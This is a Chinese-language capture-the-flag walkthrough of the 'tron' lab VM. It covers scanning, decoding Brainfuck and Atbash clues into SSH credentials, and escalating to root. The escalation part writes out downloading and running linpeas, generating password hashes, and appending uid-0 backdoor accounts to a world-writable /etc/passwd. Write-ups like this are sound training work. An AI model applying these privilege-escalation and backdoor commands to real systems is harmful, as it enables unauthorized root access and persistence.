|   |   |   |
|---|---|---|
|tron|easy|敏感信息收集、Brainfuck解密、替换密码、ssh利用、passwd提权|机发现
```C
netdiscover -i eth0 -r 192.168.44.0/24
```
# 端口服务
```C
nmap -sV -A -T4 -p- 192.168.44.135
```
# 目录扫描
```Css
gobuster dir  -u http://192.168.44.135/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
```

```cs
http://192.168.44.135/index.html
页面右键检查源代码
 kzhh:SbWP9q94ZtE9qD  
 
http://192.168.44.135/MCP/tron.txt
MASTER CONTROL PROGRAM
----------------------
Ram:
Do you believe in the Users?
Crom:
Sure I do! If I didn't have a User, than who wrote me? 
KysrKysrKysrK1s+Kz4rKys+KysrKysrKz4rKysrKysrKysrPDw8PC1dPj4+PisrKysrKysrKysrKy4tLS0tLi0tLS0tLS0tLS0tLisrKysrKysrKysrKysrKysrKysrKysrKy4tLS0tLS0tLS0tLS0tLS0tLS0tLS4rKysrKysrKysrKysrLg==


http://192.168.44.135/MCP/terminalserver/30513.txt
substitute
--------------------------
plaintext
abcdefghijklmnopqrstuvwxyz

ciphertext
zyxwvutsrqponmlkjihgfedcba
--------------------------


```

对kysr.............一长串的进行base64解码。再进行brainfuck解码得到`player` 
由substitute单词翻译是代替可以知道，这是简单的替换密码。替换格式也表明了明文（plaintext）密文(ciphertext)，就是把26字母倒叙替换，很容易写脚本
```python
import sys
args = sys.argv
def encrypt_plaintext(plaintext, ciphertext):
    """
    Encrypts plaintext by replacing lowercase letters with their corresponding letters in ciphertext.

    Args:
        plaintext (str): The input plaintext to be encrypted.
        ciphertext (str): The ciphertext string containing the replacement alphabet.

    Returns:
        str: The encrypted plaintext.
    """
    encrypted_text = ""
    for char in plaintext:
        if char.islower():
            index = ord(char) - ord('a')
            encrypted_text += ciphertext[index]
        else:
            encrypted_text += char
    return encrypted_text

# Given plaintext and ciphertext
plaintext = args[1]
ciphertext = "zyxwvutsrqponmlkjihgfedcba"

# Encrypt the plaintext
encrypted_plaintext = encrypt_plaintext(plaintext, ciphertext)
print("Encrypted Plaintext:", encrypted_plaintext)

```
得到密码。猜测账户就是player
```cs
┌──(kali㉿kali)-[~/桌面/OSCP]
└─$ python tron.py  kzhh:SbWP9q94ZtE9qD  
Encrypted Plaintext: pass:SyWP9j94ZgE9jD
```

# 提权

```C
┌──(root㉿kali)-[~]
└─# ssh player@192.168.44.135 //SyWP9j94ZgE9jD

player@tron:~$ cat user.txt 
HMVMuserplayer2021

player@tron:~$ ls /etc/passwd -al
-rw-r--rw- 1 root root 1399 May  1  2021 /etc/passwd

```

下载知名豌豆扫描工具linpeas发现passwd 有写入权限，那么我们可以直接写入一个root权限的用户或者更改他的账号密码
```css
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

```C
mkpasswd -m sha-512 //123
//把下面内容照着root的做修改成下面这样填入/etc/passwd
hack:$6$hxYB19Bb/77OJemB$PMJiiXKU7y2OLCD5GGO2F1hQwgsSUjEX2FyoUsQhOw4L5WlJ/26EMca3gmyMSFXtBeo4JAj5uWwv6rq.O8M6x1:0:0:root:/root:/bin/bash

su hack //123
```

# 方法二：passwd写入提权
```c
1、kali 生成密码  
perl -e 'print crypt("123456", "AA"). "\n"'
AASwmzPNx.3sg //密码：123456 ，AA 为盐
或者
生成密码： 
openssl passwd -1 -salt admin 123456 
-1 的意思是使用md5crypt加密算法 
-salt 指定盐为admin 123456 明文密码
2、生成后构造passwd文件中的条目
mysqld:AASwmzPNx.3sg:0:0:me:/root:/bin/bash
3、在被控制机器上添加后门
echo "mysqld:AASwmzPNx.3sg:0:0:me:/root:/bin/bash" >> /etc/passwd
```